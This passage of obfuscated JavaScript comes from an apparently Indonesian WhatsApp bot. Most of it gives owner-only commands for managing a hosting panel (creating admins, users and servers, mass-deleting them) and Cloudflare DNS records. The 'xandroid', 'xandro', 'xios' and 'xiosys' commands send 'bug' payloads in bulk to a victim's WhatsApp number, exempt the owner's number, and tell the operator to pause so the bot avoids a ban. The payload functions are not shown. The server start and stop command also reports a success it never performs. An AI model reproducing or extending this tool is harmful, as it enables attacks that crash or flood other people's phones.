              return _0x3a091f("❌ *Terjadi kesalahan:*\n`" + JSON.stringify(_0x27e8c9.errors[0x0], null, 0x2) + '`');
            }
            let _0x14899f = _0x27e8c9.attributes;
            let _0x5203e1 = "*👑 ADMIN BARU DITAMBAHKAN 👑*\n\n";
            _0x5203e1 += "🆔 *ID*: " + _0x14899f.id + "\n";
            _0x5203e1 += "👤 *Username*: " + _0x14899f.username + "\n";
            _0x5203e1 += "📧 *Email*: " + _0x14899f.email + "\n";
            _0x5203e1 += "📝 *Nama*: " + _0x14899f.first_name + " " + _0x14899f.last_name + "\n";
            _0x5203e1 += "🌐 *Bahasa*: " + _0x14899f.language + "\n";
            _0x5203e1 += "🛡️ *Admin*: " + (_0x14899f.root_admin ? 'Ya' : 'Tidak') + "\n";
            _0x5203e1 += "📅 *Dibuat pada*: " + _0x14899f.created_at;
            await _0x3a091f(_0x5203e1);
            let _0x57d787 = "*🔑 DETAIL LOGIN ADMIN 🔑*\n\n";
            _0x57d787 += "📧 *Email*: " + _0x388eb1 + "\n";
            _0x57d787 += "📝 *Username*: " + _0x4f33e7 + "\n";
            _0x57d787 += "🔑 *Password*: " + _0x281d53 + "\n";
            _0x57d787 += "🌐 *Panel Login*: " + panel + "\n";
            await _0x3a091f(_0x57d787);
          } catch (_0x4f9864) {
            console.error(_0x4f9864);
            _0x3a091f("❌ *Terjadi kesalahan:*\n`" + _0x4f9864.message + '`');
          }
        }
        break;
      case "listuser":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x1f08dc = _0x143458[0x0] || '1';
          try {
            let _0x178045 = await fetchJson(panel + "/api/application/users?page=" + _0x1f08dc, {
              'headers': {
                'Accept': 'application/json',
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apiuser
              }
            });
            let _0x5d05fe = _0x178045.data;
            let _0x44fc10 = _0x5d05fe.length;
            let _0x5a8586 = Math.ceil(_0x44fc10 / 0x28);
            if (_0x44fc10 === 0x0) {
              return _0x3a091f("⚠️ Tidak ada pengguna yang ditemukan.");
            }
            for (let _0x2b3f5d = 0x0; _0x2b3f5d < _0x5a8586; _0x2b3f5d++) {
              let _0x34567f = "📋 *Daftar Pengguna Panel* 📋\n\n";
              let _0x25f694 = _0x5d05fe.slice(_0x2b3f5d * 0x28, (_0x2b3f5d + 0x1) * 0x28);
              for (let _0x297bdf of _0x25f694) {
                _0x34567f += "🆔 *ID*: " + _0x297bdf.attributes.id + "\n";
                _0x34567f += "👤 *Nama*: " + _0x297bdf.attributes.first_name + " " + _0x297bdf.attributes.last_name + "\n";
                _0x34567f += "📝 *Username*: " + _0x297bdf.attributes.username + "\n";
                _0x34567f += "📧 *Email*: " + _0x297bdf.attributes.email.toLowerCase() + "\n";
                _0x34567f += "🛡️ *Admin*: " + (_0x297bdf.attributes.root_admin ? 'Ya' : 'Tidak') + "\n";
                _0x34567f += "🔒 *2FA*: " + (_0x297bdf.attributes["2fa"] ? 'Aktif' : "Nonaktif") + "\n\n";
              }
              _0x34567f += "📑 *Halaman*: " + _0x178045.meta.pagination.current_page + '/' + _0x178045.meta.pagination.total_pages + "\n";
              _0x34567f += "📊 *Total Pengguna*: " + _0x178045.meta.pagination.total + "\n";
              _0x34567f += "📦 *Pengguna per Halaman*: " + _0x178045.meta.pagination.per_page + "\n";
              await _0x3a091f(_0x34567f);
            }
          } catch (_0x4e4f53) {
            console.error(_0x4e4f53);
            _0x3a091f("❌ *Terjadi kesalahan*: " + _0x4e4f53.message);
          }
        }
        break;
      case "listserver":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x395927 = _0x143458[0x0] || '1';
          try {
            let _0x178d2d = await fetchJson(panel + "/api/application/servers?page=" + _0x395927, {
              'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apiuser
              }
            });
            let _0x5ea5fc = _0x178d2d.data;
            let _0x143a06 = _0x5ea5fc.length;
            let _0x9c37fb = Math.ceil(_0x143a06 / 0x28);
            if (_0x143a06 === 0x0) {
              return _0x3a091f("⚠️ Tidak ada server yang ditemukan.");
            }
            for (let _0x1cb3e2 = 0x0; _0x1cb3e2 < _0x9c37fb; _0x1cb3e2++) {
              let _0x3b9961 = "📋 *Daftar Server Panel* 📋\n\n";
              let _0xd8e7d4 = _0x5ea5fc.slice(_0x1cb3e2 * 0x28, (_0x1cb3e2 + 0x1) * 0x28);
              for (let _0x5247ab of _0xd8e7d4) {
                _0x3b9961 += "🖥️ *Server Info*\n";
                _0x3b9961 += "🆔 *ID*: " + _0x5247ab.attributes.id + "\n";
                _0x3b9961 += "🔑 *Identifier*: " + _0x5247ab.attributes.identifier + "\n";
                _0x3b9961 += "📛 *Nama*: " + _0x5247ab.attributes.name + "\n";
                _0x3b9961 += "📝 *Deskripsi*: " + (_0x5247ab.attributes.description || "Tidak ada deskripsi") + "\n";
                _0x3b9961 += "🚫 *Suspended*: " + (_0x5247ab.attributes.suspended ? 'Ya' : 'Tidak') + "\n\n";
                _0x3b9961 += "💾 *Storage Info*\n";
                _0x3b9961 += "🧠 *Memori*: " + (_0x5247ab.attributes.limits.memory == 0x0 ? "Tidak Terbatas" : _0x5247ab.attributes.limits.memory / 0x3e8 + " GB") + "\n";
                _0x3b9961 += "📀 *Disk*: " + (_0x5247ab.attributes.limits.disk == 0x0 ? "Tidak Terbatas" : _0x5247ab.attributes.limits.disk / 0x3e8 + " GB") + "\n";
                _0x3b9961 += "⚙️ *CPU*: " + (_0x5247ab.attributes.limits.cpu == 0x0 ? "Tidak Terbatas" : _0x5247ab.attributes.limits.cpu + '%') + "\n\n";
              }
              _0x3b9961 += "📑 *Halaman*: " + _0x178d2d.meta.pagination.current_page + '/' + _0x178d2d.meta.pagination.total_pages + "\n";
              _0x3b9961 += "📊 *Total Server*: " + _0x178d2d.meta.pagination.total + "\n";
              _0x3b9961 += "📦 *Server per Halaman*: " + _0x178d2d.meta.pagination.per_page + "\n";
              await _0x3a091f(_0x3b9961);
            }
          } catch (_0x4f0631) {
            console.error(_0x4f0631);
            _0x3a091f("❌ *Terjadi kesalahan*: " + _0x4f0631.message);
          }
        }
        break;
      case "adduser":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x4c5427 = _0x2b2627.split(',');
          let _0x2531bd = _0x4c5427[0x0]?.['trim']()["toLowerCase"]();
          let _0x2d50ed = _0x4c5427[0x1]?.["trim"]();
          let _0x162f20 = _0x4c5427[0x2]?.["trim"]();
          if (!_0x2531bd || !_0x2d50ed || !_0x162f20 || !_0x4c5427[0x3]) {
            return _0x3a091f("⚠️ *Input tidak valid!*\n\nSilakan masukkan *" + (!_0x2531bd ? "email" : !_0x2d50ed ? 'username' : !_0x162f20 ? "password" : 'penerima') + "* yang benar.\n\n📌 *Format*: \n`" + (_0x4773c6 + _0x4ac520) + " email,username,password,@tag`\n\n🔹 *Contoh*: \n`" + (_0x4773c6 + _0x4ac520) + " bot@user.com,bot,bot123,@0`");
          }
          try {
            const _0x47066d = await createUser(_0x2531bd, _0x2d50ed, _0x162f20);
            if (_0x47066d.errors) {
              return _0x3a091f("❌ *Terjadi kesalahan:* \n`" + JSON.stringify(_0x47066d.errors[0x0], null, 0x2) + '`');
            }
            let _0x82d2c7 = "📋 *Pengguna Baru Ditambahkan* 📋\n\n";
            _0x82d2c7 += "🆔 *ID*: " + _0x47066d.attributes.id + "\n";
            _0x82d2c7 += "👤 *Username*: " + _0x47066d.attributes.username + "\n";
            _0x82d2c7 += "📧 *Email*: " + _0x47066d.attributes.email.toLowerCase() + "\n";
            _0x82d2c7 += "👑 *Admin*: " + (_0x47066d.attributes.root_admin ? 'Ya' : "Tidak") + "\n";
            await _0x3a091f(_0x82d2c7);
            let _0x2e28ca = "📋 *Informasi Login Pengguna* 📋\n\n";
            _0x2e28ca += "📧 *Email*: " + _0x2531bd + "\n";
            _0x2e28ca += "👤 *Username*: " + _0x2d50ed + "\n";
            _0x2e28ca += "🔑 *Password*: " + _0x162f20 + "\n";
            _0x2e28ca += "🔗 *Login*: " + panel + "\n";
            await _0x3a091f(_0x2e28ca);
          } catch (_0x520ad9) {
            console.error(_0x520ad9);
            _0x3a091f("❌ *Terjadi kesalahan*: " + _0x520ad9.message);
          }
        }
        break;
      case "addserver":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x20edd5 = _0x2b2627.split(',');
          let _0x40891e = _0x20edd5[0x0]?.["trim"]();
          let _0x301665 = _0x20edd5[0x1]?.['trim']();
          let _0x1f6f21 = _0x20edd5[0x2]?.["trim"]();
          let _0x21a759 = _0x20edd5[0x3]?.["trim"]();
          let _0x13c626 = _0x20edd5[0x4]?.["trim"]();
          if (!_0x40891e || !_0x301665 || !_0x1f6f21 || !_0x21a759 || !_0x13c626) {
            return _0x3a091f("⚠️ *Input tidak valid!* \n\nSilakan masukkan *" + (!_0x40891e ? 'nama' : !_0x301665 ? "ID pengguna" : !_0x1f6f21 ? "kapasitas memori" : !_0x21a759 ? "kapasitas disk" : "CPU") + "* yang benar.\n\n📌 *Format*: \n`" + (_0x4773c6 + _0x4ac520) + " name,userid,memo,disk,cpu`\n\n🔹 *Contoh*: \n`" + (_0x4773c6 + _0x4ac520) + " bot,6,1200,1200,100`");
          }
          if (isNaN(_0x301665) || isNaN(_0x1f6f21) || isNaN(_0x21a759) || isNaN(_0x13c626)) {
            return _0x3a091f("⚠️ *Input harus berupa angka!* \n\nBagian *" + (isNaN(_0x301665) ? "ID pengguna" : isNaN(_0x1f6f21) ? "Memori" : isNaN(_0x21a759) ? "Disk" : "CPU") + "* harus diisi dengan angka.\n\n📌 *Format*: \n`" + (_0x4773c6 + _0x4ac520) + " name,userid,memo,disk,cpu`\n\n🔹 *Contoh*: \n`" + (_0x4773c6 + _0x4ac520) + " bot,6,1200,1200,100`");
          }
          try {
            const _0x22f693 = await getEggStartupCommand();
            const _0x3ae258 = _0x22f693.attributes.startup;
            let _0x1dd560 = await createServer(_0x40891e, _0x301665, _0x3ae258, _0x1f6f21, _0x13c626, _0x21a759);
            if (_0x1dd560.errors) {
              return _0x3a091f("❌ *Terjadi kesalahan:*\n`" + JSON.stringify(_0x1dd560.errors[0x0], null, 0x2) + '`');
            }
            let _0x97a291 = "🎊 *Server baru berhasil ditambahkan!* ✅\n\n";
            _0x97a291 += "💻 *Informasi Server*:\n";
            _0x97a291 += "🆔 *ID*: " + _0x1dd560.attributes.id + "\n";
            _0x97a291 += "🔑 *Identifier*: " + _0x1dd560.attributes.identifier + "\n";
            _0x97a291 += "📛 *Nama*: " + _0x1dd560.attributes.name + "\n";
            _0x97a291 += "💾 *Memori*: " + _0x1dd560.attributes.limits.memory + " MB\n";
            _0x97a291 += "📦 *Disk*: " + _0x1dd560.attributes.limits.disk + " MB\n";
            _0x97a291 += "⚙️ *CPU*: " + _0x1dd560.attributes.limits.cpu + "%\n";
            await _0x3a091f(_0x97a291);
          } catch (_0x846f70) {
            console.error(_0x846f70);
            _0x3a091f("❌ *Terjadi kesalahan:* `" + _0x846f70.message + '`');
          }
        }
        break;
      case 'delserver':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x361875 = _0x143458[0x0];
          if (!_0x361875) {
            return _0x3a091f("⚠️ Silakan berikan *ID Server* yang ingin dihapus.");
          }
          try {
            let _0x1c1094 = await deleteServer(_0x361875);
            if (_0x1c1094.errors) {
              return _0x3a091f("⚠️ Server tidak ditemukan. Pastikan ID yang dimasukkan benar.");
            }
            _0x3a091f("✅ Server berhasil dihapus dari sistem.");
          } catch (_0x24ad70) {
            console.error(_0x24ad70);
            _0x3a091f("❌ Gagal menghapus server. Jika Anda pemilik, silakan cek konsol.");
          }
        }
        break;
      case "delallserver":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          await _0x3a091f(mess.wait);
          try {
            let _0x4b18d8 = await fetch(global.panel + '/api/application/servers', {
              'method': "GET",
              'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'Authorization': "Bearer " + global.apiuser
              }
            });
            let _0x56e7e3 = await _0x4b18d8.json();
            if (!_0x56e7e3 || !_0x56e7e3.data || _0x56e7e3.data.length === 0x0) {
              return _0x3a091f("⚠️ Tidak ada server yang ditemukan.");
            }
            let _0x433b60 = 0x0;
            for (let _0x428911 of _0x56e7e3.data) {
              if (_0x428911.attributes.id === 0x1) {
                continue;
              }
              let _0x51bb45 = await deleteServer(_0x428911.attributes.id);
              if (_0x51bb45.success) {
                _0x433b60++;
              }
            }
            _0x3a091f("✅ Berhasil menghapus " + _0x433b60 + " server dari sistem (kecuali server dengan ID 1).");
          } catch (_0x20b793) {
            console.error(_0x20b793);
            _0x3a091f("❌ Gagal menghapus server. Jika Anda pemilik, silakan cek konsol.");
          }
        }
        break;
      case "deluser":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x3ead58 = _0x143458[0x0];
          if (!_0x3ead58) {
            return _0x3a091f("⚠️ Silakan berikan *ID Pengguna* yang ingin dihapus.");
          }
          try {
            let _0x5356fd = await deleteUser(_0x3ead58);
            if (_0x5356fd.errors) {
              return _0x3a091f("⚠️ Pengguna tidak ditemukan. Pastikan ID yang dimasukkan benar.");
            }
            _0x3a091f("✅ Pengguna dengan ID *" + _0x3ead58 + "* berhasil dihapus dari sistem.");
          } catch (_0x3cdcbf) {
            console.error(_0x3cdcbf);
            _0x3a091f("❌ Gagal menghapus pengguna. Jika Anda pemilik, silakan cek konsol.");
          }
        }
        break;
      case "delalluser":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          await _0x3a091f(mess.wait);
          try {
            let _0x24f8b0 = await fetch(global.panel + "/api/application/users", {
              'method': 'GET',
              'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'Authorization': "Bearer " + global.apiuser
              }
            });
            let _0x47ed71 = await _0x24f8b0.json();
            if (!_0x47ed71 || !_0x47ed71.data || _0x47ed71.data.length === 0x0) {
              return _0x3a091f("⚠️ Tidak ada pengguna yang ditemukan.");
            }
            let _0x558c3c = 0x0;
            for (let _0x17e214 of _0x47ed71.data) {
              if (_0x17e214.attributes.id === 0x1) {
                continue;
              }
              let _0x297a02 = await deleteUser(_0x17e214.attributes.id);
              if (_0x297a02.success) {
                _0x558c3c++;
              }
            }
            _0x3a091f("✅ Berhasil menghapus " + _0x558c3c + " pengguna dari sistem (kecuali pengguna dengan ID 1).");
          } catch (_0x463295) {
            console.error(_0x463295);
            _0x3a091f("❌ Gagal menghapus pengguna. Jika Anda pemilik, silakan cek konsol.");
          }
        }
        break;
      case "startserver":
      case 'stopserver':
      case 'restartserver':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x5391f1 = _0x4ac520.replace("server", '');
          let _0x390b37 = _0x143458[0x0];
          if (!_0x390b37) {
            return _0x3a091f("⚠️ Silakan masukkan *ID Server* yang ingin dikontrol.");
          }
          try {
            _0x3a091f("✅ Server berhasil *" + _0x5391f1 + '*.');
          } catch (_0x3cccac) {
            console.error(_0x3cccac);
            _0x3a091f("❌ Gagal menjalankan perintah. Jika Anda pemilik, silakan cek konsol.");
          }
        }
        break;
      case "1gb":
      case "2gb":
      case "3gb":
      case "4gb":
      case "5gb":
      case "6gb":
      case "7gb":
      case "8gb":
      case "9gb":
      case "10gb":
      case "11gb":
      case "12gb":
      case "13gb":
      case "14gb":
      case '15gb':
      case "16gb":
      case "17gb":
      case '18gb':
      case "19gb":
      case "20gb":
      case '21gb':
      case "22gb":
      case '23gb':
      case "24gb":
      case "25gb":
      case "26gb":
      case '27gb':
      case "28gb":
      case "29gb":
      case '30gb':
      case "31gb":
      case '32gb':
      case '33gb':
      case "34gb":
      case "35gb":
      case "36gb":
      case '37gb':
      case "38gb":
      case "39gb":
      case '40gb':
      case "41gb":
      case "42gb":
      case "43gb":
      case "44gb":
      case "45gb":
      case "46gb":
      case "47gb":
      case "48gb":
      case '49gb':
      case "50gb":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Mohon masukkan *nama pengguna atau nomor* yang valid.\n\n💁 *Contohnya:*\n" + (_0x4773c6 + _0x4ac520 + " John Doe"));
          }
          let _0x1ca01b = _0x2b2627.split(',');
          let _0x157801 = _0x1ca01b[0x0].trim();
          if (!_0x157801) {
            return _0x3a091f("⚠️ Mohon masukkan *nama pengguna atau nomor* yang valid.\n\n💁 *Contohnya:*\n" + (_0x4773c6 + _0x4ac520 + " John Doe"));
          }
          try {
            const _0x998630 = (_0x157801 + "@users.com").toLowerCase();
            const _0x5583ae = randomBytes(0x5).toString('hex');
            const _0x5b1abe = _0x4ac520.replace('gb', '');
            const _0xa8a3f3 = _0x5b1abe + '200';
            const _0xc9e212 = _0x5b1abe * 0x2 * 0xa;
            const _0x531085 = _0x5b1abe + "200";
            const _0x106a02 = await createUser(_0x998630, _0x157801, _0x5583ae);
            if (!_0x106a02.errors) {
              const _0x7286ec = await getEggStartupCommand();
              const _0x47efea = _0x7286ec.attributes.startup;
              const _0x529d79 = await createServer(_0x157801 + " " + _0x4ac520.toUpperCase(), _0x106a02.attributes.id, _0x47efea, _0xa8a3f3, _0xc9e212, _0x531085);
              if (_0x529d79.errors) {
                return _0x3a091f("❌ *Terjadi kendala saat membuat server.*\n" + ("🛠️ *Detail:* \n```" + JSON.stringify(_0x529d79.errors[0x0], null, 0x2) + '```'));
              }
              let _0x3a9708 = "✅ *Panel berhasil dibuat!*\n\n";
              _0x3a9708 += "👤 *Informasi Pengguna:*\n";
              _0x3a9708 += "🆔 *ID:* `" + _0x106a02.attributes.id + "`\n";
              _0x3a9708 += "📛 *Username:* `" + _0x106a02.attributes.username + "`\n";
              _0x3a9708 += "📩 *Email:* `" + _0x106a02.attributes.email + "`\n\n";
              _0x3a9708 += "🖥️ *Detail Server:*\n";
              _0x3a9708 += "🆔 *ID:* `" + _0x529d79.attributes.id + "`\n";
              _0x3a9708 += "📌 *Nama:* `" + _0x529d79.attributes.name + "`\n";
              _0x3a9708 += "💾 *Memori:* `" + _0x529d79.attributes.limits.memory + "MB`\n";
              _0x3a9708 += "📦 *Disk:* `" + _0x529d79.attributes.limits.disk + "MB`\n";
              _0x3a9708 += "⚙️ *CPU:* `" + _0x529d79.attributes.limits.cpu + "%`\n";
              await _0x3a091f(_0x3a9708);
              let _0x46dd82 = "🔑 *Detail Akun Panel:*\n\n";
              _0x46dd82 += "📩 *Email:* `" + _0x998630 + "`\n";
              _0x46dd82 += "📛 *Username:* `" + _0x106a02.attributes.username + "`\n";
              _0x46dd82 += "🔐 *Password:* `" + _0x5583ae + "`\n";
              _0x46dd82 += "🌍 *Login Panel:* " + panel + "\n\n";
              _0x46dd82 += "📌 Simpan baik-baik informasi ini untuk login ke panel Anda. 😊";
              await _0x3a091f(_0x46dd82);
            } else {
              _0x3a091f("❌ *Terjadi kendala saat membuat akun.*\n" + ("🛠️ *Detail:* \n```" + JSON.stringify(_0x106a02.errors[0x0], null, 0x2) + "```"));
            }
          } catch (_0x12e8e4) {
            console.error(_0x12e8e4);
            _0x3a091f("❌ *Oops, ada kesalahan!*\n" + ("🛠️ *Detail:* \n```" + _0x12e8e4.message + "```"));
          }
          break;
        }
      case "unli":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Mohon masukkan *nama pengguna atau nomor* yang valid.\n\n💁 *Contohnya:*\n" + (_0x4773c6 + _0x4ac520 + " John Doe"));
          }
          let _0x28ac7d = _0x2b2627.split(',');
          let _0x1e2b0e = _0x28ac7d[0x0].trim();
          if (!_0x1e2b0e) {
            return _0x3a091f("⚠️ Mohon masukkan *nama pengguna atau nomor* yang valid.\n\n💁 *Contohnya:*\n" + (_0x4773c6 + _0x4ac520 + " John Doe"));
          }
          try {
            const _0x1b99dc = (_0x28ac7d[0x0] + '@users.com').toLowerCase();
            const _0x23416b = randomBytes(0x5).toString("hex");
            const _0x528d14 = await createUser(_0x1b99dc, _0x1e2b0e, _0x23416b);
            if (!_0x528d14.errors) {
              const _0x30be65 = await getEggStartupCommand();
              const _0x27ccdd = _0x30be65.attributes.startup;
              const _0x22d83c = await createServer(_0x1e2b0e + " " + _0x4ac520, _0x528d14.attributes.id, _0x27ccdd, '0', '0', '0');
              if (_0x22d83c.errors) {
                return _0x3a091f("❌ *Terjadi kendala saat membuat server.*\n" + ("🛠️ *Detail:* \n```" + JSON.stringify(_0x22d83c.errors[0x0], null, 0x2) + "```"));
              }
              let _0x523ff9 = "✅ *Panel berhasil dibuat!*\n\n";
              _0x523ff9 += "👤 *Informasi Pengguna:*\n";
              _0x523ff9 += "🆔 *ID:* `" + _0x528d14.attributes.id + "`\n";
              _0x523ff9 += "📛 *Username:* `" + _0x528d14.attributes.username + "`\n";
              _0x523ff9 += "📩 *Email:* `" + _0x528d14.attributes.email + "`\n\n";
              _0x523ff9 += "🖥️ *Detail Server:*\n";
              _0x523ff9 += "🆔 *ID:* `" + _0x22d83c.attributes.id + "`\n";
              _0x523ff9 += "📌 *Nama:* `" + _0x22d83c.attributes.name + "`\n";
              _0x523ff9 += "💾 *Memori:* `" + _0x22d83c.attributes.limits.memory + "MB`\n";
              _0x523ff9 += "📦 *Disk:* `" + _0x22d83c.attributes.limits.disk + "MB`\n";
              _0x523ff9 += "⚙️ *CPU:* `" + _0x22d83c.attributes.limits.cpu + "%`\n";
              await _0x3a091f(_0x523ff9);
              let _0x27e7db = "🔑 *Detail Akun Panel:*\n\n";
              _0x27e7db += "📩 *Email:* `" + _0x1b99dc + "`\n";
              _0x27e7db += "📛 *Username:* `" + _0x528d14.attributes.username + "`\n";
              _0x27e7db += "🔐 *Password:* `" + _0x23416b + "`\n";
              _0x27e7db += "🌍 *Login Panel:* " + panel + "\n\n";
              _0x27e7db += "📌 Simpan baik-baik informasi ini untuk login ke panel Anda. 😊";
              await _0x3a091f(_0x27e7db);
            } else {
              _0x3a091f("❌ *Terjadi kendala saat membuat akun.*\n" + ("🛠️ *Detail:* \n```" + JSON.stringify(_0x528d14.errors[0x0], null, 0x2) + "```"));
            }
          } catch (_0x5eea7e) {
            console.error(_0x5eea7e);
            _0x3a091f("❌ *Oops, ada kesalahan!*\n" + ("🛠️ *Detail:* \n```" + _0x5eea7e.message + '```'));
          }
          break;
        }
      case "listsubdo":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          try {
            let _0x3f0923 = await getDnsRecords();
            if (typeof _0x3f0923 === 'string') {
              return _0x3a091f(_0x3f0923);
            }
            if (_0x3f0923.length === 0x0) {
              return _0x3a091f("📂 Tidak ada subdomain yang terdaftar.");
            }
            let _0x3cf5e7 = "📜 *Daftar Subdomain Cloudflare* 📜\n\n";
            for (let _0x4ce984 of _0x3f0923) {
              _0x3cf5e7 += "🆔 *ID*: `" + _0x4ce984.id + "`\n";
              _0x3cf5e7 += "📌 *Tipe*: " + _0x4ce984.type + "\n";
              _0x3cf5e7 += "🌐 *Nama*: " + _0x4ce984.name + "\n";
              _0x3cf5e7 += "➡️ *Target*: " + _0x4ce984.content + "\n\n";
            }
            await _0x3a091f(_0x3cf5e7);
          } catch (_0x8beef6) {
            console.error(_0x8beef6);
            _0x3a091f("❌ *Terjadi kesalahan*: " + _0x8beef6.message);
          }
        }
        break;
      case "addsubdo":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let [_0x474bf2, _0x3cca33, _0x99f8ef] = _0x143458;
          if (!_0x474bf2 || !_0x3cca33 || !_0x99f8ef) {
            return _0x3a091f("⚠️ Gunakan format: " + (_0x4773c6 + _0x4ac520) + " <Tipe> <Nama> <Target>\n\n*Contoh:* " + (_0x4773c6 + _0x4ac520) + " A www 192.168.1.1");
          }
          try {
            let _0x3e1ee8 = await createDnsRecord(_0x474bf2, _0x3cca33, _0x99f8ef);
            _0x3a091f(_0x3e1ee8);
          } catch (_0x222c6e) {
            console.error(_0x222c6e);
            _0x3a091f("❌ *Terjadi kesalahan*: " + _0x222c6e.message);
          }
        }
        break;
      case "delsubdo":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x4b0920 = _0x143458[0x0];
          if (!_0x4b0920) {
            return _0x3a091f("⚠️ Silakan berikan *ID* subdo yang ingin dihapus.\n\nGunakan " + (_0x4773c6 + _0x4ac520) + " untuk melihat ID subdomain.");
          }
          try {
            let _0x52b143 = await deleteDnsRecord(_0x4b0920);
            _0x3a091f(_0x52b143);
          } catch (_0x4a2a63) {
            console.error(_0x4a2a63);
            _0x3a091f("❌ *Terjadi kesalahan*: " + _0x4a2a63.message);
          }
        }
        break;
      case "xandroid":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Gunakan format yang benar ya! *Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " nomor,jumlah\nMisalnya: " + (_0x4773c6 + _0x4ac520) + " 6281234567890,10");
          }
          let _0x5250db = _0x2b2627.split(',')[0x0];
          let _0x51f6ab = _0x2b2627.split(',')[0x1] * 0x5;
          if (!_0x5250db || !_0x51f6ab) {
            return _0x3a091f("Jangan lupa diisi ya! Gunakan format: " + (_0x4773c6 + _0x4ac520) + " nomor,jumlah\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " 6281234567890,10");
          }
          if (isNaN(parseInt(_0x51f6ab))) {
            return _0x3a091f("Jumlahnya harus berupa angka, jangan bikin bingung ya! 😅");
          }
          let _0x3d011a = _0x5250db.replace(/[^0-9]/g, '');
          let _0xe5f7f1 = '' + encodeURI(_0x51f6ab);
          let _0x5b2312 = await _0x59f5fa.onWhatsApp(_0x3d011a + '@s.whatsapp.net');
          let _0x21ebca = _0x3d011a + "@s.whatsapp.net";
          if (_0x3d011a == ownerNumber) {
            return;
          }
          if (_0x5b2312.length == 0x0) {
            return _0x3a091f("Nomor ini tidak terdaftar di WhatsApp, jadi gak bisa dikirim deh. 😓");
          }
          _0x3a091f("Tunggu sebentar, proses bug sedang berjalan... 😏");
          await sleep(0x7d0);
          _0x569c2a(_0x21ebca, _0xe5f7f1);
          await sleep(0x9c4);
          _0x23bdb1("Yeay! Bug berhasil dikirim ke @" + _0x21ebca.split('@')[0x0] + " dengan *" + _0x4ac520 + "* ✅\n\nSekarang istirahat dulu ya, biar bot gak kena banned, tunggu 2 menit. 😉", [_0x21ebca]);
        }
        break;
      case "xandro":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x320b7b) {
            return _0x3a091f("Fitur ini hanya buat bot, jadi Kamu gak bisa pakai deh. 🤖");
          }
          if (!_0x2b2627) {
            return _0x3a091f("Ayo, isi jumlahnya dong! Gunakan formatnya: " + (_0x4773c6 + _0x4ac520) + " 5");
          }
          if (isNaN(parseInt(_0x2b2627))) {
            return _0x3a091f("Jumlahnya harus angka ya! 😅");
          }
          let _0x302ab8 = encodeURI(_0x2b2627) * 0xc8;
          _0x3a091f("Tunggu sebentar, bug lagi diproses nih... 😏");
          await sleep(0x5dc);
          _0x569c2a(from, _0x302ab8);
          await sleep(0x9c4);
          _0x3f87c6.react('✅');
        }
        break;
      case 'xios':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Formatnya salah! Gunakan " + (_0x4773c6 + _0x4ac520) + " nomor,jumlah\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " 6281234567890,10");
          }
          let _0x1e8ccd = _0x2b2627.split(',')[0x0];
          let _0x49c12b = _0x2b2627.split(',')[0x1] * 0x5;
          if (!_0x1e8ccd || !_0x49c12b) {
            return _0x3a091f("Kamu lupa masukkan nomor dan jumlahnya! 😅\nGunakan format: " + (_0x4773c6 + _0x4ac520) + " nomor,jumlah\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " 6281234567890,10");
          }
          if (isNaN(parseInt(_0x49c12b))) {
            return _0x3a091f("Jumlahnya harus angka ya, gak boleh sembarangan! 😬");
          }
          let _0x4cd695 = _0x1e8ccd.replace(/[^0-9]/g, '');
          let _0x20a022 = '' + encodeURI(_0x49c12b);
          let _0x4ae00a = await _0x59f5fa.onWhatsApp(_0x4cd695 + "@s.whatsapp.net");
          let _0x4abcf8 = _0x4cd695 + "@s.whatsapp.net";
          if (_0x4cd695 == ownerNumber) {
            return;
          }
          if (_0x4ae00a.length == 0x0) {
            return _0x3a091f("Nomor ini gak terdaftar di WhatsApp, gak bisa kirim bug deh. 😓");
          }
          _0x3a091f("Tunggu sebentar, bug sedang diproses... 😏");
          await sleep(0x7d0);
          _0x508bc2(_0x4abcf8, _0x20a022);
          await sleep(0x9c4);
          _0x23bdb1("Yeay! Bug berhasil dikirim ke @" + _0x4abcf8.split('@')[0x0] + " menggunakan *" + _0x4ac520 + "* ✅\n\nSekarang istirahat dulu, tunggu 2 menit supaya bot gak dibanned ya! 😉", [_0x4abcf8]);
        }
        break;
      case "xiosys":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x320b7b) {
            return _0x3a091f("Fitur ini cuma buat bot ya, bukan buat manusia 🤖");
          }
          if (!_0x2b2627) {
            return _0x3a091f("Gunakan formatnya yang benar ya! *Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " 5");
          }
          if (isNaN(parseInt(_0x2b2627))) {
            return _0x3a091f("Jumlahnya harus angka, gak boleh asal ketik! 😬");
          }
